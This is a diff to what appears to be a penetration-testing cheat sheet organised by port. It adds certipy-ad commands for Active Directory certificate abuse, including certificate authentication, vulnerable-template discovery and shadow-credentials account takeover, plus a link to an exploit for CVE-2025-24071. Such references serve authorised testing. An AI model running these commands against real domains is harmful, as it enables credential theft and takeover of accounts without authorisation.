@@ -95,6 +95,7 @@ nmap -n -Pn -p80 -sV --script=http-default-account 'IP'
 - certipy-ad
 ```sh
 certipy-ad auth -pfx 'FILENAME' -dc-ip 'IP'
+certipy-ad auth -pfx 'FILENAME' -dc-ip 'IP' -u 'USERNAME' -d 'DOMAIN'
 ```
 - impacket-GetNPUsers ![GitHub Repo stars](https://img.shields.io/github/stars/fortra/impacket?style=social)
 - impacket-GetUserSPNs
@@ -126,8 +127,14 @@ https://github.com/XiaoliChan/wmiexec-Pro
 ## 389
 - certipy-ad
 ```sh
+certipy-ad account -user 'USERNAME'-dc-ip 'IP' -u 'USERNAME'@'DOMAIN' -p 'PASSWORD' read 
  (TCP445番も必要)
-certipy-ad find -stdout -target 'IP' -enabled -vulnerable -u 'USERNAME' -p 'PASSWORD'
+certipy-ad find -stdout -dc-ip 'IP' -enabled -vulnerable -u 'USERNAME' -p 'PASSWORD'
+# shadowcredentials
+certipy-ad shadow -account 'USERNAME' -dc-ip 'IP' -u 'USERNAME'@'DOMAIN' -p 'PASSWORD' add
+certipy-ad shadow -account 'USERNAME' -dc-ip 'IP' -u 'USERNAME'@'DOMAIN' -p 'PASSWORD' list
+ (tcp88番も必要)
+certipy-ad shadow -account 'USERNAME' -dc-ip 'IP' -u 'USERNAME'@'DOMAIN' -p 'PASSWORD' auto
 ```
 - godap ![GitHub Repo stars](https://img.shields.io/github/stars/Macmod/godap?style=social)
 ```sh
@@ -318,6 +325,7 @@ smbmap -H 'IP' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r 'Recursiv
     nmap -n -Pn -p445 --script=smb-vuln-ms17-010 'IP'
     ```
   - [CVE-2007-2447](https://github.com/amriunix/CVE-2007-2447)
+  - [CVE-2025-24071](https://www.exploit-db.com/exploits/52310)
   - [ms08-067](https://github.com/andyacer/ms08_067)
     ```sh
     nmap -n -Pn -p445 --script=smb-vuln-ms08-067 'IP'
